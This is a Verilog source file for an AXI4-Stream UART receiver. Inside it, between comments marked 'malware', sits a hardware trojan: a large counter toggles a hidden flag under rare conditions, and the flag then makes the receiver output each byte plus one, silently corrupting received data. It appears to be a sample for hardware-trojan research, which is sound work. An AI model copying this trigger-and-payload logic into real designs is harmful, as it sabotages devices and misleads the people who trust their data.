`timescale 1ns / 1ps

/*
 * AXI4-Stream UART
 */
module uart_rx #
       (
           parameter DATA_WIDTH = 8
       )
       (
           input  wire                   s_axi_aclk,
           input  wire                   s_axi_aresetn,

           /*
            * AXI output
            */
           output wire [DATA_WIDTH-1:0]  output_axis_tdata,
           output wire                   output_axis_tvalid,
           input  wire                   output_axis_tready,

           /*
            * UART interface
            */
           input  wire                   rxd,

           /*
            * Status
            */
           output wire                   busy,
           output wire                   overrun_error,
           output wire                   frame_error,

           /*
            * Configuration
            */
           input  wire [15:0]            prescale

       );

reg [DATA_WIDTH-1:0] output_axis_tdata_reg = 0;
reg output_axis_tvalid_reg = 0;

reg rxd_reg = 1;

reg busy_reg = 0;
reg overrun_error_reg = 0;
reg frame_error_reg = 0;

reg [DATA_WIDTH-1:0] data_reg = 0;
reg [18:0] prescale_reg = 0;
reg [3:0] bit_cnt = 0;

assign output_axis_tdata = output_axis_tdata_reg;
assign output_axis_tvalid = output_axis_tvalid_reg;

assign busy = busy_reg;
assign overrun_error = overrun_error_reg;
assign frame_error = frame_error_reg;
//malware
    
   reg[1000:0] out=1001'd0;    // Declare 4-bit output port to get the counter values  
   reg main = 1'b1;
      
       
    always @ (posedge s_axi_aclk) begin  
        if (s_axi_aresetn)  
        begin 
         out <= 0;  
            //$display("this is if triggereed");
        end 
        else if(out == 1000-1)
          out<=0;
            
        else 
          out <= out+1;
            
      
      if(out == 1001'd999 && busy&&rxd)
      begin 
      main <= ~main;
            end
      end
    //malwatre end

always @(posedge s_axi_aclk or posedge s_axi_aresetn) begin
    if (s_axi_aresetn) begin
        output_axis_tdata_reg <= 0;
        output_axis_tvalid_reg <= 0;
        rxd_reg <= 1;
        prescale_reg <= 0;
        bit_cnt <= 0;
        busy_reg <= 0;
        overrun_error_reg <= 0;
        frame_error_reg <= 0;
    end else begin
        rxd_reg <= rxd;
        overrun_error_reg <= 0;
        frame_error_reg <= 0;

        if (output_axis_tvalid & output_axis_tready) begin
            output_axis_tvalid_reg <= 0;
        end

        if (prescale_reg > 0) begin
            prescale_reg <= prescale_reg - 1;
        end else if (bit_cnt > 0) begin
            if (bit_cnt > DATA_WIDTH+1) begin
                if (~rxd_reg) begin
                    bit_cnt <= bit_cnt - 1;
                    prescale_reg <= (prescale << 3)-1;
                end else begin
                    bit_cnt <= 0;
                    prescale_reg <= 0;
                end
            end else if (bit_cnt > 1) begin
                bit_cnt <= bit_cnt - 1;
                prescale_reg <= (prescale << 3)-1;
                data_reg <= {rxd_reg, data_reg[DATA_WIDTH-1:1]};
            end else if (bit_cnt == 1) begin
                bit_cnt <= bit_cnt - 1;
                if (rxd_reg && main ) begin                                      
                    output_axis_tdata_reg <=       data_reg+1;       //data_reg +1;
                    output_axis_tvalid_reg <= 1;
                    overrun_error_reg <= output_axis_tvalid_reg;
                end 
                else if (rxd_reg  ) begin
                    output_axis_tdata_reg <= data_reg ;
                    output_axis_tvalid_reg <= 1;
                    overrun_error_reg <= output_axis_tvalid_reg;
                end 
                
                
                else begin
                    frame_error_reg <= 1;
                end
            end
        end else begin
            busy_reg <= 0;
            if (~rxd_reg) begin
                prescale_reg <= (prescale << 2)-2;
                bit_cnt <= DATA_WIDTH+2;
                data_reg <= 0;
                busy_reg <= 1;
            end
        end
    end
end

endmodule
